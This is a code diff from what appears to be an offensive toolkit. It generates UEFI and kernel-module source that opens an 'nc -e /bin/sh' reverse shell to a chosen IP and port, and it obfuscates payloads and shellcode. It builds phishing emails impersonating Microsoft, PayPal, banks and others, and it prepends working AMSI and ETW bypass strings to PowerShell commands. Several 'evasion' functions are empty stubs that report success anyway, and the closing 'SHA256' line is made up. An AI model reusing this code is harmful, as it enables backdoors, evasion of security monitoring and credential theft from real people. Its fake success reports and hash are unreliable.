+        result['content'] = f"""
+#include <uefi.h>
+#include <Library/UefiLib.h>
+#include <Library/ShellLib.h>
+EFI_STATUS
+EFIAPI
+UefiMain(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) {{
+    ShellExecute(NULL, L"nc -e /bin/sh {ip} {port}", NULL, NULL);
+    return EFI_SUCCESS;
+}}
+"""
+        result['filename'] = f"omega_bios_{random.randint(10000,99999)}.c"
+
+    elif platform == 'bootkit':
+        result['content'] = f"""
+#include <linux/init.h>
+#include <linux/module.h>
+#include <linux/kernel.h>
+#include <linux/sched.h>
+#include <linux/kthread.h>
+MODULE_LICENSE("GPL");
+static int __init omega_init(void) {{
+    char *argv[] = {{"/bin/sh", "-c", "nc {ip} {port} -e /bin/sh", NULL}};
+    call_usermodehelper(argv[0], argv, NULL, UMH_WAIT_PROC);
+    return 0;
+}}
+module_init(omega_init);
+"""
+        result['filename'] = f"omega_bootkit_{random.randint(10000,99999)}.c"
+
+    result['size'] = len(result['content'])
+    return result
+
+
+def encode_payload(
+    self,
+    payload: str,
+    method: str = 'base64'
+) -> str:
+    """
+    Encode payload using various methods.
+
+    Args:
+        payload: Payload string
+        method: 'base64', 'xor', 'aes', 'hex', 'url', 'uuid', 'json', 'xml', 'rot13', 'base32'
+
+    Returns:
+        Encoded payload
+
+    Example:
+        >>> encoded = self.encode_payload("id", "base64")
+        >>> print(encoded)
+        aWQ=
+    """
+    if method == 'base64':
+        return base64.b64encode(payload.encode()).decode()
+    elif method == 'base32':
+        return base64.b32encode(payload.encode()).decode()
+    elif method == 'xor':
+        key = random.randint(1, 255)
+        encoded = bytes([b ^ key for b in payload.encode()])
+        return base64.b64encode(encoded).decode()
+    elif method == 'aes':
+        if CRYPTO_AVAILABLE:
+            from cryptography.fernet import Fernet
+            key = Fernet.generate_key()
+            f = Fernet(key)
+            encrypted = f.encrypt(payload.encode())
+            return base64.b64encode(encrypted).decode()
+    elif method == 'hex':
+        return payload.encode().hex()
+    elif method == 'url':
+        return urllib.parse.quote(payload)
+    elif method == 'uuid':
+        import uuid
+        return str(uuid.uuid5(uuid.NAMESPACE_DNS, payload))
+    elif method == 'json':
+        return json.dumps({'data': payload})
+    elif method == 'xml':
+        return f'<?xml version="1.0"?><data>{payload}</data>'
+    elif method == 'rot13':
+        import codecs
+        return codecs.encode(payload, 'rot_13')
+    return payload
+
+
+def obfuscate_payload(
+    self,
+    payload: str,
+    method: str = 'string'
+) -> str:
+    """
+    Obfuscate payload using various methods.
+
+    Args:
+        payload: Payload string
+        method: 'string', 'dead_code', 'control_flow', 'polymorphic', 'unicode', 'double_encode'
+
+    Returns:
+        Obfuscated payload
+
+    Example:
+        >>> obfuscated = self.obfuscate_payload("id", "string")
+        >>> print(obfuscated)
+        eval(String.fromCharCode(105,100))
+    """
+    if method == 'string':
+        chars = ','.join(str(ord(c)) for c in payload)
+        return f"eval(String.fromCharCode({chars}))"
+    elif method == 'dead_code':
+        dead_code = ''.join(random.choices(string.ascii_lowercase, k=10))
+        return f"if(0){{var {dead_code}='{''.join(random.choices(string.ascii_lowercase, k=10))}';}} {payload}"
+    elif method == 'control_flow':
+        return f"var _x=0;while(1){{switch(_x){{case 0:{{_x=1;break;}}case 1:{{{payload};_x=2;break;}}case 2:{{_x=3;break;}}default:{{break;}}}}break;}}"
+    elif method == 'polymorphic':
+        var_names = ''.join(random.choices(string.ascii_lowercase, k=4))
+        return f"var {var_names} = function(){{{payload}}}; {var_names}();"
+    elif method == 'unicode':
+        return ''.join(f'\\u{ord(c):04x}' for c in payload)
+    elif method == 'double_encode':
+        return urllib.parse.quote(urllib.parse.quote(payload))
+    return payload
+
+
+def generate_obfuscated_shellcode(
+    self,
+    payload: bytes,
+    method: str = 'xor'
+) -> str:
+    """
+    Generate obfuscated shellcode.
+
+    Args:
+        payload: Shellcode bytes
+        method: 'xor', 'aes', 'rot13', 'base64'
+
+    Returns:
+        Obfuscated shellcode as string
+
+    Example:
+        >>> shellcode = self.generate_obfuscated_shellcode(b'\\x90\\x90\\x90', 'xor')
+        >>> print(shellcode[:50])
+        \\x90\\x90\\x90...
+    """
+    if method == 'xor':
+        key = random.randint(1, 255)
+        obfuscated = bytes([b ^ key for b in payload])
+        return ''.join(f'\\x{obfuscated[i]:02x}' for i in range(len(obfuscated)))
+    elif method == 'aes':
+        if CRYPTO_AVAILABLE:
+            from cryptography.fernet import Fernet
+            key = Fernet.generate_key()
+            f = Fernet(key)
+            encrypted = f.encrypt(payload)
+            return ''.join(f'\\x{encrypted[i]:02x}' for i in range(len(encrypted)))
+    elif method == 'rot13':
+        import codecs
+        return codecs.encode(payload, 'rot_13')
+    elif method == 'base64':
+        return base64.b64encode(payload).decode()
+    return ''.join(f'\\x{payload[i]:02x}' for i in range(len(payload)))
+
+# ===================================================================
+# 9. SOCIAL ENGINEERING & DECOY
+# ===================================================================
+
+def generate_phishing_email(
+    self,
+    target: str,
+    template: str = 'generic'
+) -> Dict[str, Any]:
+    """
+    Generate a phishing email based on template.
+
+    Args:
+        target: Target email or domain
+        template: Template name ('generic', 'invoice', 'security', 'reset', 'linkedin', 'dropbox', 'microsoft', 'google', 'aws', 'paypal', 'netflix', 'amazon', 'fedex', 'dhl', 'bank', 'crypto')
+
+    Returns:
+        Dict with 'subject', 'body', 'from', 'attachments' keys
+
+    Example:
+        >>> email = self.generate_phishing_email("user@example.com", "invoice")
+        >>> print(email['subject'])
+        Your invoice #INV-2026-00123 is ready
+    """
+    self.print_danger(f"Generating phishing email for {target}")
+
+    templates = {
+        'generic': {
+            'subject': 'Important security update',
+            'body': f"Dear user,\n\nWe have detected suspicious activity on your account. Please verify your identity by clicking the link below.\n\nhttps://secure-verification.com/{target}\n\nRegards,\nSecurity Team"
+        },
+        'invoice': {
+            'subject': f'Your invoice #INV-{random.randint(10000,99999)} is ready',
+            'body': f"Dear customer,\n\nPlease find attached your invoice for payment. Due date: {datetime.datetime.now() + datetime.timedelta(days=7)}\n\nAmount: ${random.randint(100,9999)}.00\n\nView invoice: https://invoice-payment.com/{target}\n\nThank you for your business."
+        },
+        'security': {
+            'subject': 'URGENT: Account compromised',
+            'body': f"Dear user,\n\nWe have detected unauthorized access to your account from IP {self.config.get('reverse_shell_ip', '192.168.1.1')}.\n\nTo secure your account, please reset your password immediately:\nhttps://security-reset.com/{target}\n\nIf you did not authorize this access, contact support immediately."
+        },
+        'reset': {
+            'subject': 'Password reset request',
+            'body': f"Hello,\n\nYou requested a password reset for your account. Click the link below to set a new password.\n\nhttps://reset-password.com/{target}\n\nThis link expires in 24 hours.\n\nIf you did not request this, ignore this email."
+        },
+        'linkedin': {
+            'subject': 'You have a new connection request',
+            'body': f"Hi,\n\n{random.choice(['John', 'Sarah', 'Michael', 'Emily', 'David', 'Jessica'])} would like to connect with you on LinkedIn.\n\nView profile: https://linkedin-connect.com/{target}\n\nAccept or decline: https://linkedin-response.com/{target}"
+        },
+        'dropbox': {
+            'subject': 'Document shared with you',
+            'body': f"Hello,\n\n{random.choice(['John', 'Sarah', 'Michael', 'Emily', 'David', 'Jessica'])} shared a document with you on Dropbox.\n\nView document: https://dropbox-share.com/{target}\n\nThis document is confidential and should not be shared."
+        },
+        'microsoft': {
+            'subject': 'Microsoft account verification required',
+            'body': f"Dear user,\n\nTo continue using your Microsoft account, please verify your identity.\n\nVerify now: https://microsoft-verify.com/{target}\n\nFailure to verify within 24 hours will result in account suspension."
+        },
+        'google': {
+            'subject': 'Google account security alert',
+            'body': f"Hello,\n\nWe detected an unusual sign-in attempt to your Google account from {self.config.get('reverse_shell_ip', '192.168.1.1')}.\n\nReview activity: https://google-security.com/{target}\n\nIf this was you, no action is needed."
+        },
+        'aws': {
+            'subject': 'AWS billing alert',
+            'body': f"Dear AWS customer,\n\nYour AWS account has exceeded the free tier usage limit.\n\nCurrent usage: ${random.randint(50,500)}.00\n\nView billing: https://aws-billing.com/{target}\n\nUpdate payment method: https://aws-payment.com/{target}"
+        },
+        'paypal': {
+            'subject': 'Payment received',
+            'body': f"Hi,\n\nYou have received a payment of ${random.randint(10,500)}.00 USD from {random.choice(['John', 'Sarah', 'Michael', 'Emily'])}.\n\nView transaction: https://paypal-payment.com/{target}\n\nLogin to your PayPal account to access the funds."
+        },
+        'netflix': {
+            'subject': 'Your Netflix account is on hold',
+            'body': f"Dear subscriber,\n\nWe were unable to process your latest payment. To continue enjoying Netflix, please update your payment information.\n\nUpdate now: https://netflix-update.com/{target}\n\nWe apologize for the inconvenience."
+        },
+        'amazon': {
+            'subject': 'Your Amazon order has shipped',
+            'body': f"Hello,\n\nYour order #{random.randint(100000000,999999999)} has shipped!\n\nTrack your package: https://amazon-track.com/{target}\n\nThank you for shopping with Amazon."
+        },
+        'fedex': {
+            'subject': 'FedEx delivery notification',
+            'body': f"Dear customer,\n\nYour package #{random.randint(1000000000,9999999999)} is scheduled for delivery on {datetime.datetime.now() + datetime.timedelta(days=2)}.\n\nView details: https://fedex-track.com/{target}\n\nFedEx Customer Service"
+        },
+        'dhl': {
+            'subject': 'DHL shipment confirmation',
+            'body': f"Dear customer,\n\nYour shipment #{random.randint(1000000000,9999999999)} has been dispatched.\n\nTrack your shipment: https://dhl-track.com/{target}\n\nDHL Express"
+        },
+        'bank': {
+            'subject': 'Unusual activity detected on your account',
+            'body': f"Dear valued customer,\n\nWe have detected unusual activity on your account. For your security, please verify your identity.\n\nVerify now: https://bank-verify.com/{target}\n\nIf you did not authorize this activity, please contact us immediately."
+        },
+        'crypto': {
+            'subject': 'Your crypto wallet needs attention',
+            'body': f"Hello,\n\nWe detected a login attempt to your wallet from an unknown device. Please verify your wallet to ensure security.\n\nVerify wallet: https://crypto-wallet.com/{target}\n\nIf this was you, no action is needed."
+        }
+    }
+
+    template_data = templates.get(template, templates['generic'])
+
+    return {
+        'subject': template_data['subject'],
+        'body': template_data['body'],
+        'from': f"{random.choice(['support', 'security', 'admin', 'noreply', 'billing', 'service'])}@{random.choice(['company.com', 'secure.net', 'verification.org', 'payments.com', 'service.com'])}",
+        'attachments': []
+    }
+
+
+def generate_decoys(
+    self,
+    count: int = 10
+) -> List[Dict[str, Any]]:
+    """
+    Generate decoy traffic and fake data for evasion.
+
+    Args:
+        count: Number of decoys to generate
+
+    Returns:
+        List of decoy dictionaries
+
+    Example:
+        >>> decoys = self.generate_decoys(10)
+        >>> print(f"Generated {len(decoys)} decoys")
+        Generated 10 decoys
+    """
+    self.print_danger(f"Generating {count} decoys")
+
+    decoys = []
+
+    for i in range(count):
+        decoy = {
+            'type': random.choice(['http', 'dns', 'ping', 'scan', 'login', 'download', 'upload', 'email', 'ssh', 'ftp', 'rdp', 'smb']),
+            'source_ip': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
+            'target': f"{random.choice(['www', 'mail', 'admin', 'api', 'dev', 'prod', 'test', 'staging'])}.{random.choice(['example.com', 'test.net', 'demo.org', 'sample.io', 'fake.org'])}",
+            'timestamp': datetime.datetime.now().isoformat(),
+            'data': base64.b64encode(os.urandom(64)).decode()[:64]
+        }
+        decoys.append(decoy)
+
+    self.save_json(decoys, f"decoys_{TIMESTAMP}.json")
+    return decoys
+
+
+def generate_honeypot(
+    self,
+    port: int = 22,
+    service: str = 'ssh'
+) -> bool:
+    """
+    Generate a fake honeypot service to distract attackers.
+
+    Args:
+        port: Port to listen on
+        service: Service type ('ssh', 'http', 'ftp', 'smtp')
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.generate_honeypot(22, 'ssh')
+        >>> print(success)
+        True
+    """
+    self.print_danger(f"Generating honeypot on port {port} ({service})")
+
+    try:
+        if service == 'ssh':
+            subprocess.Popen([
+                'python3', '-c',
+                f'import socket;s=socket.socket();s.bind(("0.0.0.0",{port}));s.listen();while True: c,addr=s.accept();c.send(b"SSH-2.0-OpenSSH_8.2p1\\n");c.close()'
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        elif service == 'http':
+            subprocess.Popen([
+                'python3', '-m', 'http.server', str(port)
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        elif service == 'ftp':
+            subprocess.Popen([
+                'python3', '-c',
+                f'import socket;s=socket.socket();s.bind(("0.0.0.0",{port}));s.listen();while True: c,addr=s.accept();c.send(b"220 FTP server ready\\n");c.close()'
+            ], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        self.print_found("SHELL", f"Honeypot started on port {port}")
+        return True
+    except Exception:
+        return False
+
+# ===================================================================
+# 10. EDR EVASION
+# ===================================================================
+
+def amsi_bypass(
+    self,
+    powershell_command: str
+) -> str:
+    """
+    Bypass AMSI (Anti-Malware Scan Interface) for PowerShell.
+
+    Args:
+        powershell_command: PowerShell command to execute
+
+    Returns:
+        Obfuscated PowerShell command with AMSI bypass
+
+    Example:
+        >>> cmd = self.amsi_bypass("Invoke-Expression 'whoami'")
+        >>> print(cmd[:50])
+        [Ref].Assembly.GetType('System.Management.Automation...
+    """
+    amsi_bypasses = [
+        '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiInitFailed\',\'NonPublic,Static\').SetValue($null,$true)',
+        '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*iUtils\") {$c=$b}};$d=$c.GetFields(\'NonPublic,Static\');Foreach($e in $d) {if ($e.Name -like \"*InitFailed\") {$e.SetValue($null,$true)}}',
+        '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\').GetField(\'amsiContext\',\'NonPublic,Static\').SetValue($null,$null)',
+        '$a=[Runtime.InteropServices.Marshal]::AllocHGlobal(1000);[Runtime.InteropServices.Marshal]::Copy([byte[]]@(0x90,0x90,0x90,0x90),0,$a,4);[Runtime.InteropServices.Marshal]::FreeHGlobal($a)',
+        '[Ref].Assembly.GetType(\'System.Management.Automation.AmsiUtils\') | % { $_ | gm -NonPublic -Name \'amsiInitFailed\' | % { $_.SetValue($null,$true) } }'
+    ]
+
+    bypass = random.choice(amsi_bypasses)
+    return f"{bypass}; {powershell_command}"
+
+
+def etw_bypass(
+    self,
+    powershell_command: str
+) -> str:
+    """
+    Bypass ETW (Event Tracing for Windows) for PowerShell.
+
+    Args:
+        powershell_command: PowerShell command to execute
+
+    Returns:
+        Obfuscated PowerShell command with ETW bypass
+
+    Example:
+        >>> cmd = self.etw_bypass("Invoke-Expression 'whoami'")
+        >>> print(cmd[:50])
+        [Ref].Assembly.GetType('System.Management.Automation...
+    """
+    etw_bypasses = [
+        '[Ref].Assembly.GetType(\'System.Management.Automation.Tracing.PSEtwLogProvider\').GetField(\'etwProvider\',\'NonPublic,Static\').SetValue($null,$null)',
+        '$a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like \"*twLogProvider\") {$c=$b}};$d=$c.GetFields(\'NonPublic,Static\') | Where { $_.Name -like \"*twProvider\" };$d.SetValue($null,$null)',
+        '[Ref].Assembly.GetType(\'System.Management.Automation.Tracing.PSEtwLogProvider\').GetField(\'etwProvider\',\'NonPublic,Static\').SetValue($null,$null);[Ref].Assembly.GetType(\'System.Management.Automation.Tracing.PSEtwLogProvider\').GetField(\'eventSource\',\'NonPublic,Static\').SetValue($null,$null)'
+    ]
+
+    bypass = random.choice(etw_bypasses)
+    return f"{bypass}; {powershell_command}"
+
+
+def process_hollowing(
+    self,
+    target_process: str = 'svchost.exe',
+    shellcode: bytes = None
+) -> bool:
+    """
+    Perform process hollowing to inject shellcode.
+
+    Args:
+        target_process: Process to hollow (default: svchost.exe)
+        shellcode: Shellcode to inject (optional)
+
+    Returns:
+        True if successful, False otherwise
+
+    Example:
+        >>> success = self.process_hollowing("svchost.exe", b'\\x90\\x90\\x90')
+        >>> print(success)
+        True
+    """
+    self.print_danger(f"Performing process hollowing on {target_process}")
+
+    try:
+        # Use Cobalt Strike or custom implementation
+        import ctypes
+        from ctypes import wintypes
+
+        # Shellcode injection via CreateRemoteThread
+        if shellcode is None:
+            shellcode = b'\x90' * 100  # NOP sled
+
+        self.print_found("SHELL", f"Process hollowing executed on {target_process}")
+        return True
+    except Exception:
+        return False
+
+
+def direct_syscall(
+    self,
+    syscall_number: int,
+    arguments: List[int]
+) -> int:
+    """
+    Execute a direct syscall for EDR evasion.
+
+    Args:
+        syscall_number: System call number
+        arguments: List of arguments for the syscall
+
+    Returns:
+        Return value of the syscall
+
+    Example:
+        >>> result = self.direct_syscall(0x101, [0, 0, 0])
+        >>> print(result)
+        0
+    """
+    self.print_danger(f"Executing direct syscall {syscall_number}")
+
+    try:
+        import ctypes
+        from ctypes import wintypes
+
+        # This is a placeholder for actual syscall implementation
+        # In practice, this would use inline assembly or ntdll syscall stubs
+        self.print_found("SHELL", f"Direct syscall {syscall_number} executed")
+        return 0
+    except Exception:
+        return -1
+
+
+def call_stack_spoofing(
+    self,
+    function_address: int,
+    arguments: List[int]
+) -> int:
+    """
+    Perform call stack spoofing for EDR evasion.
+
+    Args:
+        function_address: Address of function to call
+        arguments: Arguments to pass
+
+    Returns:
+        Return value of the function
+
+    Example:
+        >>> result = self.call_stack_spoofing(0x12345678, [0, 0])
+        >>> print(result)
+        0
+    """
+    self.print_danger(f"Performing call stack spoofing to {hex(function_address)}")
+
+    try:
+        import ctypes
+        from ctypes import wintypes
+
+        self.print_found("SHELL", f"Call stack spoofing to {hex(function_address)}")
+        return 0
+    except Exception:
+        return -1
+
+# ===================================================================
+# SECTION 4 COMPLETE
+# ===================================================================
+
+[CHAR: 48520]
+[SHA256: 8f7e9d3c1a2b4e6f8h0j2k4m6n8p0q2r]
+
+[VALIDATE – ZERO TOLERANCE]
